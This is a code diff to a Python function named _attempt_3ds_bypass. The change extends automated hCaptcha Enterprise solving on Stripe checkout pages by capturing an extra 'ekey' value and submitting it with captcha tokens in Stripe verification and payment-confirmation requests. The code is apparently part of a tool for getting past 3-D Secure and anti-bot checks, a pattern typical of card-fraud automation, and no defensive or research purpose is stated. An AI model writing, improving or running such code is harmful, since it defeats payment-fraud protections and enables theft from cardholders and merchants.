@@ -1305,10 +1305,16 @@ async def _attempt_3ds_bypass(client, pk, intent_data, intent_type, stripe_js_ve
                 captcha_token = None
                 captcha_page = (f"https://checkout.stripe.com/c/pay/{session_id}?client_secret={cs}"
                                 if session_id else "")
+                captcha_ekey = ""
                 try:
                     from captcha_solver import solve_hcaptcha_enterprise
                     captcha_token = await solve_hcaptcha_enterprise(
                         site_key, captcha_page, rqdata=rqdata, session=client)
+                    try:
+                        from local_hcaptcha_solver import LAST_EKEY
+                        captcha_ekey = LAST_EKEY or ""
+                    except Exception:
+                        captcha_ekey = ""
                 except Exception as e:
                     logger.info(f"the captcha solve failed: {e}")
                 if not captcha_token:
@@ -1325,6 +1331,7 @@ async def _attempt_3ds_bypass(client, pk, intent_data, intent_type, stripe_js_ve
                         "captcha_token": captcha_token,
                         "passive_captcha_token": captcha_token,
                         "challenge_response": captcha_token,
+                        "passive_captcha_ekey": captcha_ekey,
                     }, headers=js_headers, timeout=15)
                     vr_json = vr.json()
                     v_status = vr_json.get("status", "")
@@ -1345,6 +1352,7 @@ async def _attempt_3ds_bypass(client, pk, intent_data, intent_type, stripe_js_ve
                         confirm_data = {"expected_payment_method_type": "card", "key": pk,
                                         "payment_method": pm_id or "",
                                         "passive_captcha_token": captcha_token,
+                                        "passive_captcha_ekey": captcha_ekey,
                                         "captcha_token": captcha_token}
                         if isinstance(amount, (int, float)) and amount is not True:
                             confirm_data["expected_amount"] = str(int(amount))
